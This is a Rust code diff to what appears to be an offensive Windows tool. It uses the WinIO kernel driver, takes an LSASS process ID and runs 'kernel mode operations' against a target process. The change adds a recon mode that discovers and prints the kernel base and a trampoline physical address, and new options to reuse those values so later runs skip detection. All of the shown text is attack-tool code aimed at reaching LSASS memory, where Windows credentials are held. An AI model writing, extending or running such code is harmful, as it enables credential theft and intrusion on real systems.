@@ -88,6 +88,18 @@ struct Cli {
     #[cfg(feature = "driver-loader")]
     #[arg(long, default_value_t = true)]
     no_unload: bool,
+
+    /// Recon mode: discover kernel info and exit
+    #[arg(long, default_value_t = false)]
+    recon: bool,
+
+    /// Precomputed kernel base (hex, skip auto-detect)
+    #[arg(long)]
+    ntos_base: Option<String>,
+
+    /// Precomputed trampoline physical address (hex, skip scan)
+    #[arg(long)]
+    trampoline: Option<String>,
 }
 
 fn main() {
@@ -371,8 +383,40 @@ fn run_winio_flow(cli: &Cli, api: &resolver::ApiResolver, lsass_pid: u32) -> Res
     println!("[*] Mode: type3");
     println!("[*] Kernel mode operations\n");
 
+    // --- Recon mode: discover kernel info and exit ---
+    if cli.recon {
+        println!("[*] Recon mode: discovering kernel info...");
+        let engine =
+            winio64::DmEngine::new(api).map_err(|e| format!("Engine init failed: {}", e))?;
+        let (ntos, tramp) = engine.get_precomputed_values();
+        println!("[+] Discovery complete. Re-run with:");
+        println!("    --ntos-base {:X} --trampoline {:X}", ntos, tramp);
+        drop(engine);
+        process::exit(0);
+    }
+
+    // --- Normal or precomputed mode ---
     println!("[*] Step 2: Initializing engine...");
-    let engine = winio64::DmEngine::new(api).map_err(|e| format!("Engine init failed: {}", e))?;
+    let engine = if let (Some(ntos_str), Some(tramp_str)) = (&cli.ntos_base, &cli.trampoline) {
+        let ntos = u64::from_str_radix(
+            ntos_str.trim_start_matches("0x").trim_start_matches("0X"),
+            16,
+        )
+        .map_err(|e| format!("Invalid ntos-base hex: {}", e))?;
+        let tramp = u64::from_str_radix(
+            tramp_str.trim_start_matches("0x").trim_start_matches("0X"),
+            16,
+        )
+        .map_err(|e| format!("Invalid trampoline hex: {}", e))?;
+        println!(
+            "    Using precomputed: ntos=0x{:X} trampoline=0x{:X}",
+            ntos, tramp
+        );
+        winio64::DmEngine::new_precomputed(api, ntos, tramp)
+            .map_err(|e| format!("Engine init failed: {}", e))?
+    } else {
+        winio64::DmEngine::new(api).map_err(|e| format!("Engine init failed: {}", e))?
+    };
     println!("[+] Engine ready");
 
     println!("[*] Step 3: Opening target process...");
